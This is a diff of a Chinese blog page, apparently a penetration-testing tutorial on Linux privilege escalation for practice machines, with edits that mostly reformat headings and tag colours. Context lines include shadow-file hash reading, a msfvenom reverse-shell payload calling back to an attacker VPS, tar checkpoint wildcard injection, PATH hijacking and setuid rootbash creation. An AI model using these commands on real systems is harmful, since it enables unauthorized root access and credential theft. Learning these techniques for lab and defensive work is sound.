@@ -255,19 +255,13 @@
 <br>
 
 <h2 id="手工枚举"><a href="#手工枚举" class="headerlink" title="手工枚举"></a>手工枚举</h2><p>获取shell后</p>
-<ol>
-<li><h3 id="查看当前人物"><a href="#查看当前人物" class="headerlink" title="查看当前人物"></a>查看当前人物</h3></li>
-</ol>
-<p><code>whoami，id，who，w，last</code></p>
+<h3 id="1-查看当前人物"><a href="#1-查看当前人物" class="headerlink" title="1.查看当前人物"></a>1.查看当前人物</h3><p><code>whoami，id，who，w，last</code></p>
 <p>last：查看最近哪些用户登录过该系统</p>
 <br>
 
 <br>
 
-<ol start="2">
-<li><h3 id="内核版本获取"><a href="#内核版本获取" class="headerlink" title="内核版本获取"></a>内核版本获取</h3></li>
-</ol>
-<p><code>uname -a</code></p>
+<h3 id="2-内核版本获取"><a href="#2-内核版本获取" class="headerlink" title="2.内核版本获取"></a>2.内核版本获取</h3><p><code>uname -a</code></p>
 <br>
 
 <p><code>lsb_release -a  Cat /proc/version</code></p>
@@ -281,10 +275,7 @@
 
 <br>
 
-<ol start="3">
-<li><h3 id="ip地址、网卡信息"><a href="#ip地址、网卡信息" class="headerlink" title="ip地址、网卡信息"></a>ip地址、网卡信息</h3></li>
-</ol>
-<p><code>ip a/addr</code></p>
+<h3 id="3-ip地址、网卡信息"><a href="#3-ip地址、网卡信息" class="headerlink" title="3.ip地址、网卡信息"></a>3.ip地址、网卡信息</h3><p><code>ip a/addr</code></p>
 <p><code>ip route</code></p>
 <p><code>ip neigh</code></p>
 <p><code>arp -a</code></p>
@@ -293,10 +284,7 @@
 
 <br>
 
-<ol start="4">
-<li><h3 id="重要命令"><a href="#重要命令" class="headerlink" title="重要命令"></a>重要命令</h3></li>
-</ol>
-<p><code>sudo -l</code>：查看当前用户是否有可以以root权限执行的命令但不需要密码（NOPASSWD）</p>
+<h3 id="4-重要命令"><a href="#4-重要命令" class="headerlink" title="4.重要命令"></a>4.重要命令</h3><p><code>sudo -l</code>：查看当前用户是否有可以以root权限执行的命令但不需要密码（NOPASSWD）</p>
 <br>
 
 <p><code>getcap -r / 2&gt;/dev/null</code>：得到权限能力，在&#x2F;下</p>
@@ -332,10 +320,7 @@
 </code></pre>
 <br>
 
-<ol>
-<li><h3 id="可读shadow文件"><a href="#可读shadow文件" class="headerlink" title="可读shadow文件"></a>可读shadow文件</h3></li>
-</ol>
-<p>Cat &#x2F;etc&#x2F;shadow：获取shadow文件：查看用户密码hash值</p>
+<h3 id="1-可读shadow文件"><a href="#1-可读shadow文件" class="headerlink" title="1.可读shadow文件"></a>1.可读shadow文件</h3><p>Cat &#x2F;etc&#x2F;shadow：获取shadow文件：查看用户密码hash值</p>
 <pre><code class="Plain">kali:$y$j9T$thVUCcCzQozwQh.2JyVRs.$T0FS1BRAcGSTCGldig/Ji2CbWc3bLVV8Ym1wEPDcIw1:19590:0:99999:7:::
 将该条存储到一个文件中: vim 文件名 
 </code></pre>
@@ -345,7 +330,7 @@
 </code></pre>
 <br>
 <br>
-2. ### 可写shadow文件
+### 2.可写shadow文件
 
 <p><code>Mkpasswd -m hash加密方式 更改的密码</code></p>
 <p>先对目标用户的密码hash值分析其hash加密方式如<code>MD5($1)，SHA-256，SHA-512($6)</code>等</p>
@@ -354,10 +339,7 @@
 <br>
 <br>
 
-<ol start="3">
-<li><h3 id="可写passwd文件"><a href="#可写passwd文件" class="headerlink" title="可写passwd文件"></a>可写passwd文件</h3></li>
-</ol>
-<pre><code class="Plain">openssl passwd 密码
+<h3 id="3-可写passwd文件"><a href="#3-可写passwd文件" class="headerlink" title="3.可写passwd文件"></a>3.可写passwd文件</h3><pre><code class="Plain">openssl passwd 密码
 </code></pre>
 <p>得到的hash在passwd文件中替换x</p>
 <p>su输入密码即可</p>
@@ -412,10 +394,7 @@ sudo LD_PRELOAD=/当前路径下/shell.so nano
 
 <br>
 
-<h2 id="自动任务提权"><a href="#自动任务提权" class="headerlink" title="自动任务提权"></a>自动任务提权</h2><ol>
-<li><h3 id="自动任务文件权限提权"><a href="#自动任务文件权限提权" class="headerlink" title="自动任务文件权限提权"></a>自动任务文件权限提权</h3></li>
-</ol>
-<p><code>cat /etc/crontab</code></p>
+<h2 id="自动任务提权"><a href="#自动任务提权" class="headerlink" title="自动任务提权"></a>自动任务提权</h2><h3 id="1-自动任务文件权限提权"><a href="#1-自动任务文件权限提权" class="headerlink" title="1.自动任务文件权限提权"></a>1.自动任务文件权限提权</h3><p><code>cat /etc/crontab</code></p>
 <p>查看是否有以root权限执行的自动任务，有.sh脚本文件更好</p>
 <p><code>locate</code>定位</p>
 <p><code>ls -liah</code> 查看该权限，若可写则编辑用bash反弹shell</p>
@@ -424,10 +403,7 @@ sudo LD_PRELOAD=/当前路径下/shell.so nano
 <br>
 <br>
 
-<ol start="2">
-<li><h3 id="自动任务PATH环境变量提权"><a href="#自动任务PATH环境变量提权" class="headerlink" title="自动任务PATH环境变量提权"></a>自动任务PATH环境变量提权</h3></li>
-</ol>
-<p><code>cat /etc/crontab</code></p>
+<h3 id="2-自动任务PATH环境变量提权"><a href="#2-自动任务PATH环境变量提权" class="headerlink" title="2.自动任务PATH环境变量提权"></a>2.自动任务PATH环境变量提权</h3><p><code>cat /etc/crontab</code></p>
 <p>可以看到有PATH环境变量</p>
 <p>自动任务中的sh脚本若不是以绝对路径显示，可以考虑编辑同名脚本劫持</p>
 <br>
@@ -452,10 +428,7 @@ chmod +xs /tmp/rootbash
 
 <br>
 
-<ol start="3">
-<li><h3 id="自动任务通配符提权"><a href="#自动任务通配符提权" class="headerlink" title="自动任务通配符提权"></a>自动任务通配符提权</h3></li>
-</ol>
-<p>真实场景中的服务器可能有每隔一段时间对一些重要目录进行打包备份的自动任务，就以tar命令为例，其中tar命令的checkpoint操作可以进行提权</p>
+<h3 id="3-自动任务通配符提权"><a href="#3-自动任务通配符提权" class="headerlink" title="3.自动任务通配符提权"></a>3.自动任务通配符提权</h3><p>真实场景中的服务器可能有每隔一段时间对一些重要目录进行打包备份的自动任务，就以tar命令为例，其中tar命令的checkpoint操作可以进行提权</p>
 <pre><code class="Plain">//首先可以用msfvenom工具自动生成一个反弹shell的语句
 
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=vps ip LPORT=监听端口 -f elf -o shell.elf
@@ -482,10 +455,7 @@ touch /当前目录/--checkpoint-action=exec=shell.elf
 <p><code>Find / -perm -u=s -type f 2&gt;/dev/null</code></p>
 <br>
 
-<ol>
-<li><h3 id="SUID可执行文件利用提权"><a href="#SUID可执行文件利用提权" class="headerlink" title="SUID可执行文件利用提权"></a>SUID可执行文件利用提权</h3></li>
-</ol>
-<p>输入以上指令后可以发现有很多文件，我们可以直接选一个文件名</p>
+<h3 id="1-SUID可执行文件利用提权"><a href="#1-SUID可执行文件利用提权" class="headerlink" title="1.SUID可执行文件利用提权"></a>1.SUID可执行文件利用提权</h3><p>输入以上指令后可以发现有很多文件，我们可以直接选一个文件名</p>
 <p>利用searchexploit来找提权脚本</p>
 <pre><code class="Plain">searchexploit suid文件
 
@@ -495,11 +465,11 @@ searchexploit suid文件 -m 提权脚本
 </code></pre>
 <br>
 <br>
-2. ### SUID共享库注入提权
+### 2.SUID共享库注入提权
 
 <p>在发现有SUID权限的.so文件时可以尝试运行和追踪该.so文件</p>
-<p>剩余操作与环境变量提权一致<br><br><br><br><br>3. ### SUID环境变量利用提权</p>
-<p>查找发现env字样的文件(strings查看可显示字符)</p>
+<p>剩余操作与环境变量提权一致<br><br><br><br></p>
+<h3 id="3-SUID环境变量利用提权"><a href="#3-SUID环境变量利用提权" class="headerlink" title="3.SUID环境变量利用提权"></a>3.SUID环境变量利用提权</h3><p>查找发现env字样的文件(strings查看可显示字符)</p>
 <p>对没有使用绝对路径的引用我们可以劫持到绝对路径使得系统执行我们的提权操作</p>
 <pre><code class="Plain">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
@@ -525,7 +495,7 @@ export PATH=.:$PATH
 </code></pre>
 <br>
 <br>
-4. ### 利用SUID-shell功能提权1
+### 4.利用SUID-shell功能提权1
 
 <p>当3中对绝对路径的引用时，我们考虑通过bash低版本</p>
 <pre><code class="Plain">bash --version
@@ -538,7 +508,7 @@ export -f /usr/sbin/service
 </code></pre>
 <br>
 <br>
-5. ### 利用SUID-shell功能提权2
+### 5.利用SUID-shell功能提权2
 
 <p>Bash version&lt;&#x3D;4.4考虑对bash环境变量进行设置</p>
 <pre><code class="Plain">env -i SHELLOPTS=strace PS4=&#39;$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)&#39;  suid文件名(绝对路径)
@@ -547,20 +517,17 @@ export -f /usr/sbin/service
 <br>
 <br>
 
-<h2 id="密码与密钥提权"><a href="#密码与密钥提权" class="headerlink" title="密码与密钥提权"></a>密码与密钥提权</h2><ol>
-<li><h3 id="历史文件查看"><a href="#历史文件查看" class="headerlink" title="历史文件查看"></a>历史文件查看</h3></li>
-</ol>
-<pre><code class="Plain">history
+<h2 id="密码与密钥提权"><a href="#密码与密钥提权" class="headerlink" title="密码与密钥提权"></a>密码与密钥提权</h2><h3 id="1-历史文件查看"><a href="#1-历史文件查看" class="headerlink" title="1.历史文件查看"></a>1.历史文件查看</h3><pre><code class="Plain">history
 
 cat /root/.bash_history
 </code></pre>
 <br>
 <br>
-2. ### 配置文件查看
+### 2.配置文件查看
 
 <p>就像我之前打的一台bizness靶机，其中Apache OFBiz组件包含了数据库，就是通过数据库配置文件来查看密码的</p>
-<p>如ovpn、数据库文件等配置文件可以查看<br><br><br><br><br>3. ### SSH密钥敏感信息</p>
-<p>靶机中权限可能可以允许我们查看SSH配置文件，无论是公钥还是私钥都有可能提权的价值，调整ssh的参数后尝试连接以获取更高等级的权限<br><br><br><br><br><br></p>
+<p>如ovpn、数据库文件等配置文件可以查看<br><br><br><br></p>
+<h3 id="3-SSH密钥敏感信息"><a href="#3-SSH密钥敏感信息" class="headerlink" title="3.SSH密钥敏感信息"></a>3.SSH密钥敏感信息</h3><p>靶机中权限可能可以允许我们查看SSH配置文件，无论是公钥还是私钥都有可能提权的价值，调整ssh的参数后尝试连接以获取更高等级的权限<br><br><br><br><br><br></p>
 <h2 id="内核利用提权"><a href="#内核利用提权" class="headerlink" title="内核利用提权"></a>内核利用提权</h2><p>这种利用通常在其他几种方法都不奏效的情况下才使用，因为内核利用可能导致系统不稳定或会向管理员报警，因此会导致被发现溯源等，所以不到所有手段耗尽不轻易使用<br><br><br>内核利用主要利用工具为<code>linpeas</code>，如果靶机中有<code>curl</code>命令可以直接将执行脚本下载到靶机，如果没有用nc传输</p>
 <pre><code class="Plain">//查看内核版本
 uname -a  
@@ -616,7 +583,7 @@ cat /etc/doas.conf
         
         <span class="tag">
             
-            <a href="/tags/Linux%E6%8F%90%E6%9D%83-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #00a596">Linux提权 渗透测试</a>
+            <a href="/tags/Linux%E6%8F%90%E6%9D%83-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #00bcd4">Linux提权 渗透测试</a>
         </span>
         
     </div>
@@ -709,7 +676,7 @@ AXIOM分析检材，结合题目附件DESKTOP.dmp就针对有desktop文件夹的
         
         <span class="tag">
             
-            <a href="/tags/CTF-Misc-%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/" style="color: #03a9f4">CTF-Misc 电子取证</a>
+            <a href="/tags/CTF-Misc-%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/" style="color: #00bcd4">CTF-Misc 电子取证</a>
         </span>
         
     </div>
@@ -1139,7 +1106,7 @@ echo urlencode(serialize($a));
         
         <span class="tag">
             
-            <a href="/tags/CTF-Web-Session/" style="color: #03a9f4">CTF-Web Session</a>
+            <a href="/tags/CTF-Web-Session/" style="color: #ffa2c4">CTF-Web Session</a>
         </span>
         
     </div>
